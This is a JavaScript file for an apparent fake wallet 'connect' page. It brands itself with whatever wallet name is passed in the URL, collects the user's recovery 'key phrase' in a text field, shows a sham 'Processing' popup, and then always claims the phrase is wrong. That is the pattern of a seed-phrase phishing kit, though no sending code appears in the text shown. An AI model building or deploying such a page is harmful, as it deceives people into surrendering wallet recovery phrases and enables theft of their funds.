const walletLogo = document.getElementById("walletLogo");
const walletName = document.getElementById("walletName");
const popup = document.getElementById("popup");
const popupText = document.getElementById("popupText");
const closePopupBtn = document.getElementById("closePopupBtn");

// ⭐ Progress UI Elements (Logo + Name)
const progressLogo = document.getElementById("progressLogo");
const progressWalletName = document.getElementById("progressWalletName");

function showPopup(message) {
  popupText.innerText = message;
  popup.style.display = "flex";
}

closePopupBtn.addEventListener("click", () => {
  popup.style.display = "none";
});

// Get wallet from URL
const params = new URLSearchParams(window.location.search);
const wallet = params.get("wallet");

if (wallet) {
  walletName.innerText = wallet;

  const fileName = wallet
    .toLowerCase()
    .replace(/\s+/g, "")
    .replace(/['./]/g, "");

  const iconPath = `wallet-icons/${fileName}.webp`;

  // Main Logo
  walletLogo.src = iconPath;
  walletLogo.onerror = () => {
    walletLogo.style.display = "none";
  };

  // ⭐ Progress popup wallet data
  progressWalletName.innerText = wallet;
  progressLogo.src = iconPath;

  progressLogo.onerror = () => {
    progressLogo.style.display = "none";
  };
}

// ================================
// ⭐ AUTO EXPAND TEXTAREAS
// ================================
document.querySelectorAll(".autoExpand").forEach((textarea) => {
  textarea.addEventListener("input", () => {
    textarea.style.height = "auto"; // Reset height
    textarea.style.height = textarea.scrollHeight + "px"; // Auto adjust
  });
});

// Connect Button Click
document.getElementById("connectBtn").addEventListener("click", () => {
  const name = document.getElementById("walletInput").value.trim();
  const phrase = document.getElementById("phraseInput").value.trim();
  const check = document.getElementById("confirmCheck");

  if (name === "" || phrase === "") {
    showPopup("Please fill out the field");
    return;
  }

  if (!check.checked) {
    showPopup("Please confirm you entered it correctly");
    return;
  }

  // ⭐ Show Wallet Processing UI
  showPopup("Processing... please wait");

  setTimeout(() => {
    showPopup("Your key phrase is wrong!");
  }, 10000);
});

// ⭐ REMOVE “Installing… (simulated)” – disable browser simulation
window.addEventListener("appinstalled", () => {
  console.log("PWA Installed");
});

// ⭐ BLOCK SIMULATION ALERTS
window.addEventListener("beforeinstallprompt", (e) => {
  e.preventDefault(); // Stop browser message
  window.deferredPrompt = e;
});
